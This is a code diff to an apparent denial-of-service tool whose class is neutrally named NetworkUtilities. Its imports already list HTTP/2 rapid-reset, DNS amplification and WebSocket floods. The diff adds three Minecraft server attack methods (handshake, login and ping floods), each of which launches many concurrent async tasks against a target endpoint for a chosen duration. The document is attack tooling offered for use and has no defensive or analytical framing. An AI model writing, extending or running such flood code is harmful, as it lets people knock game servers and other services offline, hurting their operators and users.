@@ -255,6 +255,9 @@ class NetworkUtilities:
             H2RapidReset,
             DNSAmplification,
             WebSocketFlood,
+            MinecraftHandshakeFlood,
+            MinecraftLoginFlood,
+            MinecraftPingFlood,
         )
 
         method = method.upper()
@@ -345,5 +348,41 @@ class NetworkUtilities:
                     for task in tasks:
                         task.cancel()
                     await dns_amp.wait_done()
+
+            elif method == "MCHANDSHAKE":
+                mc_handshake = MinecraftHandshakeFlood(endpoint, duration=duration)
+                tasks = []
+                for _ in range(threads):
+                    tasks.append(asyncio.create_task(mc_handshake._handshake_flood()))
+                try:
+                    await asyncio.sleep(duration)
+                finally:
+                    for task in tasks:
+                        task.cancel()
+                    await mc_handshake.wait_done()
+
+            elif method == "MCLOGIN":
+                mc_login = MinecraftLoginFlood(endpoint, duration=duration)
+                tasks = []
+                for _ in range(threads):
+                    tasks.append(asyncio.create_task(mc_login._login_flood()))
+                try:
+                    await asyncio.sleep(duration)
+                finally:
+                    for task in tasks:
+                        task.cancel()
+                    await mc_login.wait_done()
+
+            elif method == "MCPING":
+                mc_ping = MinecraftPingFlood(endpoint, duration=duration)
+                tasks = []
+                for _ in range(threads):
+                    tasks.append(asyncio.create_task(mc_ping._ping_flood()))
+                try:
+                    await asyncio.sleep(duration)
+                finally:
+                    for task in tasks:
+                        task.cancel()
+                    await mc_ping.wait_done()
 
         asyncio.run(run_flood())
